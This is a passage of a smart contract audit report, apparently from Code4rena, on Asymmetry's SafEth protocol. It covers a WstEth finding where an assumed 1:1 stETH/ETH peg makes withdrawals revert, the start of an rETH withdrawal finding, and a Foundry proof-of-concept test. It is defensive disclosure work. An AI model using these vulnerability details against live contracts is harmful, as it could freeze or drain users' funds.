</span><span class=\"mtk12\">W_ETH_ADDRESS</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/693#issuecomment-1500457920\">toshiSat (Asymmetry) disputed via duplicate issue <code>#693</code></a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Using Chainlink to get price instead of poolPrice.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/33\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/28\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/6\">0x52</a>.</p>\n<hr>\n<h2 id=\"h-06-wsteth-derivative-assumes-a-11-peg-of-steth-to-eth\" style=\"position:relative;\"><a href=\"#h-06-wsteth-derivative-assumes-a-11-peg-of-steth-to-eth\" aria-label=\"h 06 wsteth derivative assumes a 11 peg of steth to eth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/588\">[H-06] <code>WstEth</code> derivative assumes a <code>~1=1</code> peg of stETH to ETH</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/588\">adriro</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1069\">monrel</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1043\">0xepley</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/922\">tnevler</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/891\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/871\">sinarette</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/843\">handsomegiraffe</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/792\">auditor0517</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/788\">0xRajkumar</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/736\">Emmanuel</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/701\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/700\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/679\">eyexploit</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/648\">0xMirce</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/639\">lukris02</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/615\">Tricko</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/576\">IgorZuk</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/548\">Franfran</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/534\">Bahurum</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/532\">Bahurum</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/519\">shaka</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/468\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/466\">jasonxiale</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/442\">nadin</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/434\">RedTiger</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/402\">NoamYakov</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/389\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/383\">BPZ</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/334\">y1cunhui</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/318\">Bauer</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/272\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/271\">koxuan</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/253\">igingu</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/242\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/204\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/203\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/188\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/134\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/71\">Co0nan</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/40\">ad3sh_</a></em></p>\n<p>The <code>WstEth</code> contract implements the ETH derivative for the Lido protocol. The stETH token is the liquid representation of the ETH staked in this protocol.</p>\n<p>There are two different places in the codebase that indicate that the implementation is assuming a peg of 1 ETH ~= 1 stETH, each with different consequences. Even though both tokens have a tendency to keep the peg, this hasn’t been always the case as it can be seen in <a href=\"https://nomics.com/exchanges/curve-curve-finance-ethereum/markets/0xae7ab96520de3a18e5e111b5eaab095312d7fe84-0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\">this charth</a> or <a href=\"https://dune.com/LidoAnalytical/Curve-ETHstETH\">this dashboard</a>. There have been many episodes of market volatility that affected the price of stETH, notably the one in last June when stETH traded at ~0.93 ETH.</p>\n<p>The first indication of such an assumption is the implementation of <code>ethPerDerivative</code>. This function is intended to work as an estimation of the current value in ETH of one unit (1e18) of the underlying asset. In this implementation, the function simply queries the amount of stETH for one unit (1e18) of wstETH and returns that value, which clearly indicates a conversion rate of 1 stETH = 1 ETH.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L86-L88\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L86-L88</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IWStETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getStETHByWstETH</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The other indication and most critical one is in the <code>withdraw</code> function. This function is used by the <code>SafEth</code> contract to unstake user positions and rebalance weights. In the implementation for the <code>WstEth</code> derivative, the function will unwrap the wstETH for stETH and use the Curve pool to exchange the stETH for ETH:</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">IWStETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">).</span><span class=\"mtk11\">unwrap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">STETH_TOKEN</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">STETH_TOKEN</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LIDO_CRV_POOL</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">IStEthEthPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LIDO_CRV_POOL</span><span class=\"mtk1\">).</span><span class=\"mtk11\">exchange</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stEthBal</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// solhint-disable-next-line</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:         (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">:             </span><span class=\"mtk8\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">:         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Failed to send Ether&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>The issue is the calculation of the <code>minOut</code> variable that is sent to the Curve <code>exchange</code> function to validate the output amount of the trade. As we can see in line 60, the calculation is simply applying the slippage percentage to stETH balance. This means that for example, given the default slippage value of 1%, trading 1 stETH will succeed only if the rate is above 0.99. Larger amounts will be more concerning as the Curve AMM implements non-linear invariants, the price impact will be bigger. The <code>rebalanceToWeights</code> function withdraws <strong>all the balance</strong> before rebalancing, which means it will try to swap all the stETH held by the contract.</p>\n<p>This could be mitigated by adjusting the <code>maxSlippage</code> variable to allow for lower exchange rates. However this would imply additional issues. First, the <code>setMaxSlippage</code> is an admin function that needs to be manually updated with extreme care. In times of high volatility the owners won’t be able to update this variable as frequently as needed to keep up with the exchange rate. This means that users that want to exit their position won’t be able to do so since the exchange for this derivative will fail (see PoC for a detailed example). Second, on the contrary, if the owners decide to set a higher slippage value by default to allow for unexpected market conditions, withdrawals and rebalancing (in particular) will be victim of sandwich attacks by MEV bots.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following test replicates the market conditions during last June where stETH was trading at 0.93 ETH (needs to be forked from mainnet at block ~15000000). Here, the user wants to exit their position but the call to <code>unstake</code> will revert since the exchange in the Curve pool will fail as the output amount will be less than the expected minimum.</p>\n<p>Note: the snippet shows only the relevant code for the test. Full test file can be found <a href=\"https://gist.github.com/romeroadrian/a2895a85360276cf4f29d23de3282859\">here</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Run this test forking mainnet at block height 15000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_WstEth_withdraw_AssumesPegToEth</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Setup derivative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">deployer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safEth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wstEth</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Deal balance to user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">depositValue</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// user stakes ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safEth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">depositValue</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// user tries to unstake, action will fail due to stETH being prices at around 0.93-0.95 ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userShares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">safEth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Exchange resulted in fewer coins than expected&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safEth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">unstake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">userShares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommendation-1\" style=\"position:relative;\"><a href=\"#recommendation-1\" aria-label=\"recommendation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>The user should be able to decide on the slippage and set the expected minimum output amount to correctly handle different market conditions and user expectations. Similar to how decentralized exchanges work, the user experience can be improved by using a front-end that queries current exchange rates and offers the user a preview of the estimated output amount.</p>\n<p>The <code>ethPerDerivative</code> function should also take into account the results of swapping the stETH for ETH using the Curve pool, similar to how the <code>SfrxEth</code> derivative implementation works.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/588#issuecomment-1500489141\">toshiSat (Asymmetry) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Using Chainlink to get price instead of assuming 1:1.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Not fully mitigated. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/40\">adriro</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/13\">0x52</a> - and also shared below in the <a href=\"#mitigation-review\">Mitigation Review</a> section.</p>\n<hr>\n<h2 id=\"h-07-rethsol-withdrawals-are-unreliable-and-depend-on-excess-rocketdepositpool-balance-which-can-brick-the-whole-protocol\" style=\"position:relative;\"><a href=\"#h-07-rethsol-withdrawals-are-unreliable-and-depend-on-excess-rocketdepositpool-balance-which-can-brick-the-whole-protocol\" aria-label=\"h 07 rethsol withdrawals are unreliable and depend on excess rocketdepositpool balance which can brick the whole protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/210\">[H-07] <code>Reth.sol</code>: Withdrawals are unreliable and depend on excess <code>RocketDepositPool</code> balance which can brick the whole protocol</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/210\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1151\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1081\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1070\">HHK</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/751\">0Kage</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/625\">0xRobocop</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/599\">0x52</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/591\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/264\">igingu</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/138\">Cryptor</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/132\">carrotsmuggler</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/39\">ToonVH</a></em></p>\n<p>The Asymmetry protocol promises that a user can call <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L108-L129\"><code>SafETH.unstake</code></a> at all times. What I mean by that is that a user should be able at all times to burn his <code>SafETH</code> tokens and receive <code>ETH</code> in return. This requires that the derivatives held by the protocol can at all times be withdrawn (i.e. converted to <code>ETH</code>).</p>\n<p>Also the <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L138-L155\"><code>rebalanceToWeights</code></a> functionality requires that the derivatives can be withdrawn at all times. If a derivative cannot be withdrawn then the <code>rebalanceToWeights</code> function cannot be executed which means that the protocol cannot be adjusted to use different derivatives.</p>\n<p>For the <code>WstEth</code> and <code>SfrxEth</code> derivatives this is achieved by swapping the derivative in a Curve pool for <code>ETH</code>. The liquidity in the respective Curve pool ensures that withdrawals can be processed at all times.</p>\n<p>The <code>Reth</code> derivative works differently.</p>\n<p>Withdrawals are made by calling the <code>RocketTokenRETH.burn</code> function:</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L107-L114\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @audit this is how rETH is converted to ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">RocketTokenRETHInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// solhint-disable-next-line</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sent</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Failed to send Ether&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The issue with this is that the <code>RocketTokenRETH.burn</code> function only allows for <em>excess balance</em> to be withdrawn. I.e. ETH that has been deposited by 